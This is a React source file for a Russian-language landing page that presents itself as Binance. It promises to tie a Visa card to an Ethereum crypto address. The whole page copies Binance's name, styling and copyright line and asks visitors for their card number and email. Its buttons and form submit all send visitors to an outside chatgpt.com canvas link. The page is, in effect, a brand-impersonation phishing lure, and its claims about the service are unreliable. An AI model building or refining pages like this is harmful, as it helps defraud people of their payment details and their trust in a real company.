import React from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";

export default function BinanceVisaLanding() {
  const redirectToCanvas = "https://chatgpt.com/canvas/shared/6811e13d6024819182dd563ed6267588";

  const steps = [
    {
      title: "1. Привяжите карту Visa",
      desc: "Введите данные карты — мы создадим защищённую связь с вашим криптокошельком.",
    },
    {
      title: "2. Получите Ethereum-адрес",
      desc: "Каждой карте присваивается уникальный адрес для получения и отправки средств.",
    },
    {
      title: "3. Переводите мгновенно",
      desc: "Ваши активы доступны для перевода в блокчейне 24/7.",
    },
  ];

  return (
    <div className="bg-black text-white min-h-screen font-sans">
      {/* Header */}
      <header className="flex justify-between items-center p-6 border-b border-gray-800">
        <h1 className="text-2xl font-bold text-yellow-400">Binance</h1>
        <a href={redirectToCanvas} target="_blank" rel="noopener noreferrer">
          <button
            className="bg-yellow-400 text-black font-semibold px-6 py-3 rounded-2xl shadow-xl"
            aria-label="Активировать карту"
          >
            Активировать
          </button>
        </a>
      </header>

      {/* Hero Section */}
      <section className="text-center py-24 px-4">
        <h2 className="text-4xl md:text-5xl font-extrabold mb-4">
          Ваша Visa. Теперь в блокчейне.
        </h2>
        <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto">
          Объедините банковскую карту с криптокошельком и отправляйте активы через Ethereum всего в один клик.
        </p>
        <div className="mt-8">
          <a href={redirectToCanvas} target="_blank" rel="noopener noreferrer">
            <button className="bg-yellow-400 text-black px-6 py-3 text-lg font-bold rounded-2xl shadow-xl">
              Подключить карту
            </button>
          </a>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-20 bg-gray-900 px-4">
        <h3 className="text-3xl font-bold text-center mb-12">Как это работает</h3>
        <div className="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
          {steps.map(({ title, desc }, index) => (
            <Card key={`step-${index}`} className="bg-gray-800 border border-gray-700 rounded-2xl">
              <CardContent className="p-6">
                <h4 className="text-xl font-semibold text-yellow-400 mb-2">{title}</h4>
                <p className="text-gray-300">{desc}</p>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      {/* Activation Form */}
      <section className="py-20 px-4 text-center">
        <h3 className="text-3xl font-bold mb-6">Активируйте свой криптоадрес</h3>
        <p className="text-gray-400 mb-8 max-w-xl mx-auto">
          Введите данные вашей карты и электронной почты — мы отправим инструкции по активации криптоадреса.
        </p>
        <form
          className="max-w-md mx-auto space-y-4"
          onSubmit={(e) => {
            e.preventDefault();
            window.open(redirectToCanvas, "_blank", "noopener,noreferrer");
          }}
        >
          <Input
            type="text"
            placeholder="Номер карты Visa"
            className="bg-gray-800 border-gray-700"
            required
            aria-label="Номер карты Visa"
          />
          <Input
            type="email"
            placeholder="E-mail"
            className="bg-gray-800 border-gray-700"
            required
            aria-label="Электронная почта"
          />
          <button
            type="submit"
            className="bg-yellow-400 text-black w-full font-bold py-2 rounded-xl"
          >
            Подключить и активировать
          </button>
        </form>
      </section>

      {/* Footer */}
      <footer className="text-center py-8 text-gray-500 text-sm border-t border-gray-800">
        © {new Date().getFullYear()} Binance — Все права защищены.
      </footer>
    </div>
  );
}
